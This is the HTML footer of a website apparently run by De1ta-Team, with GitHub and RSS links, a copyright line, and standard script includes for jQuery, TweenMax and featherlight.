            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/De1ta-team">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="/atom.xml">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @De1ta-Team. All right reserved
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>